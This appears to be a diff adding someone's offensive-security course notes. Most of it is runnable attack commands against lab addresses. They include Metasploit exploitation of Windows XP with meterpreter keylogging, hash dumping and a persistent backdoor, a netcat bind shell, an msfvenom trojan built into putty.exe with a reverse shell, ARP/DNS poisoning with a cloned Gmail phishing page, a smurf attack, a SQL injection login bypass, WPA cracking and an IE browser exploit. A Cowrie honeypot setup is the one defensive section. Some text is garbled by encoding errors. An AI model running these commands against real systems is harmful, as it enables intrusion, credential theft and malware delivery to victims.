@@ -1,0 +1,534 @@
+□ Scanning - Host discovery  - to determining the host is alive or not .
+					® Manual 
+					® Write a script to check it (ping)
+					® Using nmap 
+						Nmap -sn 192.168.1.0/24
+						
+						- -sT : full connect scan  ( is more reliable) 
+						- -sS : half connect scan   (stealth , create less noise , require sudo privileges )
+						◊ OS detection 
+							} >> sudo nmap -O <ip> 
+==================================================================================================================
+Enumeration 
+
+	• The process of extracting the information from the open ports.
+		
+		From windows  machine
+		• DNS enumeration 
+		• Taking dns zone data 
+		1. In nslookup 
+			>> set type=ns 
+			>> checkpoint.com
+			>> server ns1.<checkpoint.com>
+			>> ls -d checkpoint.com
+==================================================================================================================			
+	• Tracert 
+		
+	• Hping3 -> to make custome ip packet 
+		
+		Sudo hping -a 1.8.1.1  192.168.80.128 -c 1 -S
+		
+==================================================================================================================
+Exploit Windows XP SP1
+
+	1. Search for vulnerability  MS02-026 
+	2. Search for exploit 
+	3. Compile the code 
+	4. ./a.out 6 <windows ip >
+	5. You will have a cmd 
+	
+
+	• Drawback 
+	1. It is not secure , it may contain virus
+	2. It open cmd using system user , that’s not happen 
+	3. When we disconnect cmd the victim machine will restart 
+	
+	• Using Metasploit ( it is stealth ) 
+	i. >> mfsconsole 
+	ii. >> search ms03-026
+	iii. Search for vulnerability 
+	iv. msf6 > use exploit/windows/dcerpc/ms03_026_dcom 
+	v. >> set payload <tab tab> 
+	vi. >> set payload windows/shell/bind_tcp
+	vii. Show options
+	viii. >> set RHOST <windows ip>
+	ix. >>exploit 
+	• Note : we have solved two problems 
+	• It is reputed code 
+	• When we disconnect cmd the victim machine will not restart 
+	x. >> set payload windows/adduser
+	>> set RHOST
+	>> set user <name>
+	>> exploit 
+	
+	• Using windows/meterpreter/bind_tcp
+	1. >> use windows/meterpreter/bind_tcp
+	2. >> show option 
+	3. >> exploit 
+	4. You will be in the victim machine 
+	i. >> sysinfo
+	ii. Note : you wont see cmd.exe on the victim machine but you still in the victim machine
+	iii. Add backdoor 
+	>> run  metsvc
+	
+	You will see the port no 31337 on the victim machine.
+	>> getpid 
+	
+	• Note it will in the svchost.exe 
+	iv. >> getuid -> get your user id
+	v. >> ps -> to see the process 
+	vi. >>migrate 1016   (explorer.exe) a stable process 
+	vii. >> ps 
+	viii.  we can kill any process from meterpreter 
+		>> kill <pid>
+	ix. >> keyscan_start
+	 victim add this key 
+	>> keyscan_dump 
+	You will see the keys that victim has added   
+	
+	x. >> screenshot -> to take screenshot of the machine 
+	xi. >> to get the sceen recording vnc 
+	xii. >> hashdump
+	 you will see the hashes in NTLM format 
+	
+		The NTLM hash is the cryptographic format in which user passwords are stored on Windows systems. 
+		
+		
+	Choose the secound part of the hash
+	xiii. Crack using the online netcracker 
+	• Learn Metasploit 
+	Metasploit unleashed  
+	
+==============================================================================================================================	
+Honey Pot
+Cowrie : 
+Read : virtual environment 
+
+	1. Run ssh on any other port 
+		/etc/ssh/sshd_config 
+		
+		• Add port number 
+	2. Install pre-requisites 
+	>>  sudo apt-get install git python-virtualenv libssl-dev build-essential libpython3-dev         python3-minimal authbind virtualenv 
+		
+		And python 3.8 
+		
+		sudo apt update
+		sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libsqlite3-dev libreadline-dev libffi-dev curl libbz2-dev
+		
+		>> sudo curl -O https://www.python.org/ftp/python/3.8.2/Python-3.8.2.tar.xz
+		
+		>> sudo tar -xf Python-3.8.2.tar.xz
+		
+		cd Python-3.8.2
+		./configure --enable-optimizations
+		
+		make -j 4
+		
+		sudo make altinstall
+		
+		Python 3.8.2
+		
+	3. Create non-root user
+		>> sudo adduser --disabled-password cowrie 
+	
+	4. Configure authbind 
+		Auth bind is feature that open a port with least privileges or in control manner . 
+		
+		>> sudo touch /etc/authbind/byport/22
+		
+		 # create a file with port number that the service is running (honeypot)
+		
+		>> sudo chown cowrie.cowrie  /etc/authbind/byport/22
+		
+		>> sudo chmod 777 /etc/authbind/byport/22
+		
+	5. Create virtual environment  
+		a. Switch user to cowrie ( make sure you are in the cowrie's home directory)
+		b. Git clone <cowrie repository>
+		c. Cd /cowrie 
+		>> virtualenv --python=python3.8 cowrie-env 
+		
+		# virtualenv --python=<virsion we need> <name>
+		• You will see a directory with name of 'cowrie-env ' and all the required things in that directory 
+		• To activate cowrie 
+			>> source cowrie-env/bin/activate 
+				To deactivate it 
+				>> deactivate 
+				
+			In the virtual env 
+			
+		• To install python dependencies 
+			Upgrade pip 
+			
+			>> pip install --upgrade pip 
+			
+			
+			>> pip install --updrade -r requirement.txt 
+			
+			
+		• Make copy of etc/cowrie.cfg.dist etc/cowrie.cfg
+		>> cp etc/cowrie.cfg.dist etc/cowrie.cfg
+		
+		• Edit config file line 585 (listen_endpoints )
+			# to make run cowrie on port 22 
+		• Create DB
+			>> nano etc/userdb.txt
+			Add 
+			
+			root :x:!123456  # it wont accept 123456
+			root:x:*       # it will accept any password 
+			
+		• Start cowrie 
+			>> bin/cowrie start 
+			
+			Check status 
+			
+			>>  bin/cowrie status
+			
+		
+		Testing : 
+		
+		
+		Login via ssh into honeypot 
+		
+		To check Log file of honey pot 
+		
+		>> sudo tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.log
+		
+		
+		>> ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@192.168.80.128 < honey pot ip>
+		
+		
+		
+		Download any file  and check  at below path 
+		
+		/home/cowrie/cowrie/var/lib/cowrie/downloads
+		  
+===============================================================================================	  
+Recon NG - web reconnaissance tool 
+
+
+	1. Configure time zone
+		>> sudo dpkg reconfigure tzdata
+	2. Install dependencies 
+		>>sudo apt-get install python3-pip git  python3-setuptools
+	3. Clone git repo of recon-ng
+		>> git clone https://github.com/lanmaster53/recon-ng.git
+	4. Change directorty 
+		>> sudo pip3 install -r REQUIREMENTS
+	5. Check version 
+		./recon-ng --version
+		
+	6. >> ./recon-ng
+	7. For Sync 
+	>> marketplace refresh 
+	>> marketplace info all 
+	8. Marketplace search
+		>> marketplace search hackertarget
+		
+		
+		
+		It will give path 
+		<path>
+	9. Install hackertarget 
+		Marketplace install <path>
+				recon/domains-hosts/hackertarget
+	10. Check install or not 
+		>> marketplace info recon/domains-hosts/hackertarget
+			
+		>> marketplace install recon/domains-hosts/hackertarget
+		
+		>> modules load recon/domains-hosts/hackertarget 
+		
+		[prompt will change ]
+		
+		
+	11. Set source (target)
+		
+		>> info # to check source 
+		>> options set SOURCE checkpoint.com
+		>> run 
+	12. To check what details what we have 
+	>> dashboard 
+	>> show hosts
+
+	14. Extract only IP data 
+	15. Note the IP output into treepad 
+	
+---------------------------------------------------------------------------------------------
+	• Forward dns lookup bruteforce 
+	• Objective to find IP range , IP , software details 
+	
+	>> host www. Checkpoint.com
+	>> host ftp. Checkpoint.com
+	>> host mail. Checkpoint.com
+	
+	If name exists 
+	
+	• Get the commonly used domain name (like www,www1 ns1……)
+	• Automate it with script to get the IP of server ( via bash or any other programming language )
+	• Note it into treepad 
+
+
+	• Reverse DNS bruteforce 
+	• Take ip run through loop and find out the domain 
+=======================================================================================================================	
+DNS lookup bruteforce
+
+
+	• Forward dns lookup bruteforce 
+	• Objective to find IP range , IP , software details 
+	
+	>> host www. Checkpoint.com
+	>> host ftp. Checkpoint.com
+	>> host mail. Checkpoint.com
+	
+	If name exists 
+	
+	• Get the commonly used domain name (like www,www1 ns1……)
+	• Automate it with script to get the IP of server ( via bash or any other programming language )
+	• Note it into treepad 
+
+
+	• Reverse DNS bruteforce 
+	• Take ip run through loop and find out the domain 
+===============================================================================================================
+
+Netcat - backdoor 
+Bind shell 
+
+Windows -  victim
+
+	1. Extract netcat install 
+
+Nc -lvvp 4444 -e cmd.exe
+
+Linux - attack 
+
+	1. Install natcat 
+	2. Nc -v <windows Ip> 4444
+
+	1. Reverse shell
+	2. Bind shell 
+
+==========================================================================================================	
+SMURF attack
+
+hping3 --icmp -c  --spoof 192.168.1.20 192.168.1.255
+=================================================================================================
+SQL Injection
+
+Ultimate goal is to make backend query to true.
+
+
+
+	Ã˜ select * from user where username = '' AND password ='';
+	
+	When you add valid username and password it will evaluate to true 
+	
+	And user gets its dashboard 
+	
+	Ã˜ We can bypass this when we evaluate the query to be true 
+	
+	Ã˜ select * from user where 
+	username = ' '  OR 1=1
+	 AND 
+	password =' ' OR  1 = 1;
+====================================================================================================
+Wireless Security
+
+	1. Atheros chipset 
+	2. Check ipconfig (adapter)
+	3. Or airmon-ng
+	4. Or iwconfig 
+	â€¢ If a machine is reading a packet is  reading and processing a packet which not belongs to the machine it known as promiscuous mode.
+		In wireless it is known as monitor mode and in LAN it known as promiscuous mode.
+
+>> mkdir 
+>> airmon-ng start wlan0
+
+	â€¢ View wireless objects around you
+>> airodump-ng --band wlan0mon
+
+	â€¢ Copy password file 
+>> cp path/to/password  password.txt
+
+	â€¢ To crack using password file 
+>> aircrack-ng -w password.txt -b <mac address of target>  psk*.cap 
+
+To crack using john 
+
+>> john -stdout -increamental | aircrack-ng -b <mac >  -w -psk*.cap 
+
+
+	â€¢ Tools - wifi_pineapple 
+
+	â€¢ Forcefully dissconnecting wifi 
+	
+	>> mdk3 wlan0mond 
+	
+	â€¢ Channel jam
+	>> airodump-ng-wlan0mon
+============================================================================================================================	
+Poisonings attack
+
+	â€¢ ARP poisoning attack : 
+
+	1. Install dependencies (Attacker)
+	 >> sudo apt-get install ca-certificates libnetfilter-queue-dev libpcap-dev unzip wget
+	
+	2. Download bettercap 
+	3. Add a file .csp file
+			# probe
+			net.probe on
+			
+			# spoof
+			set arp.spoof.fullduplex true
+			
+			set arp.spoof.targets 192.168.80.131
+			arp.spoof on
+			set net.sniff.local true
+			
+			#attack 
+			net.sniff on
+			
+	4. >> sudo ./bettercap -face ens33 -caplet spoof.cap 
+
+
+
+	â€¢ DNS poisoning
+	
+	Now attacker is change the DNS cache of the victim and redirect to the fake web page that is attackers webpage , it can be any login page and from there it can steal password.
+	
+	
+	
+	
+	Domain Name Server (DNS) spoofing (a.k.a. DNS cache poisoning) is an attack in which altered DNS records are used to redirect online traffic to a fraudulent website that resembles its intended destination.
+
+# probe
+net.probe on
+
+# spoof
+set arp.spoof.fullduplex true
+
+set arp.spoof.targets 192.168.80.131
+arp.spoof on
+set net.sniff.local true
+
+# dns spoof 
+
+set dns.spoof.all true
+set dns.spoof.domains iacsd.com
+ dns.spoof on
+
+1. >> sudo ./bettercap -face ens33 -caplet spoof.cap 
+
+
+	2. >> git clone <git repo vamseeth/gmail-login> /var/www/html
+	
+	
+	
+	â€¢ Mac flooding 
+	  
+	
+	Switch map mac with its interface in its mac table . To store this information it has some limited memory. In the mac flood attack the attacker continuously send the new mac entry to the switch  and its acts like a HUB. It broadcast the message to every host in the network and attacker can read those packets by running its interface in promiscous mode.
+	
+192.168.80.128
+
+192.168.80.131
+
+================================================================================================================================
+Trojan
+
+Hiding malicious application inside a software.
+
+	1. Creating trojan application
+>> msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp  lhost=192.168.80.132 lport=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe 
+
+	-a, --arch  [architecture]
+	
+	-x, --template  [path]   ( executable)
+	              Specify a custom executable file to use as a template
+	
+	-k, --keep
+	              Preserve the template behavior and inject the payload as a new thread
+	
+	-p, --payload [payload]  Payload to use. Specify a '-' or stdin to use custom payloads
+	
+	-e = encoding 
+	 
+           -I = iteration 
+
+	-b = bad character 
+	
+	-f = format 
+	
+	-o = output file name  
+	
+	
+	
+	1. You will get an puttyX.exe  file
+	
+	2. >> puttyX.exe cp  /var/www/html/
+	
+
+It will give you the malicious application  
+
+
+	2. Using attack and adding payload 
+	3. Listening reverse shell 
+
+Metasploit :
+
+Mfs6> use exploit/multi/handler
+
+Mfs          set PAYLOAD windows windows/meterpreter/reverse_tcp
+
+>>set LHOST 192.168.80.132                                 <attackers ip>
+
+>>set LPORT 4444
+
+>>exploit 
+
+When victim run the application You will get the cli  
+
+Internet explorer  window 7 
+
+============================================================================================================
+Aurora  attack 
+
+
+# Using exploit  
+use exploit/windows/browser/ms11_003_ie_css_import
+
+# setting payload 
+set payload windows/meterpreter/reverse_tcp
+
+# setting ip 
+set LHOST 192.168.80.132 (kali)
+
+# setting server ip 
+set SRVHOST 192.168.80.132 (kali)
+
+# setting url which (url should visible to victim)
+set URIPATH /tinku
+
+# this is javascript 
+set OBFUSCATE false 
+
+exploit 
+
+	â€¢ When user click url using explorer it will give you two session 
+	Listing session : mfs 6> session -l
+	
+	Change session : mfs6> session  -I <session no> 
+
+=============================================================================================================================
+macflooding
+	macof -i eth0 -d 192.168.1.1 
+macchanging
+	macchanger -m (macadd) eth0
+ipspoofing
+		ifconfig eth0 192.168.1.1
+===============================================================================================================================
